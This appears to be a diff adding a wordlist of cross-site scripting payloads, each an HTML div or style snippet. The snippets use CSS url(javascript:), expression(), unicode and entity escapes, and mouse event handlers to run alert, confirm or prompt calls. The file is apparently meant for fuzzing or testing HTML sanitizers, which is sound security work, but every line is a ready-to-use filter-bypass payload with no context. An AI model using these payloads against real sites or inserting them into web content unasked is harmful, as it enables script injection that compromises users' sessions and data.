@@ -1,0 +1,18 @@
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<div/style="width:expression(confirm(1))">X</div> 
+<DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”> 
+<DIV STYLE=”width: expression(alert(‘XSS’));”>
+<div/onmouseover='alert(1)'> style="x:">
+<div style=content:url(%(svg)s)></div>
+<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
+<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
+<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
+<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
+<div id="x">XXX</div> <style> #x{font-family:foo[bar;color:green;} #y];color:red;{} </style>
+<x style="background:url('x&#1;;color:red;/*')">XXX</x>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
+<div style="font-family:'foo&#10;;color:red;';">XXX
+<div style="font-family:foo}color=red;">XXX
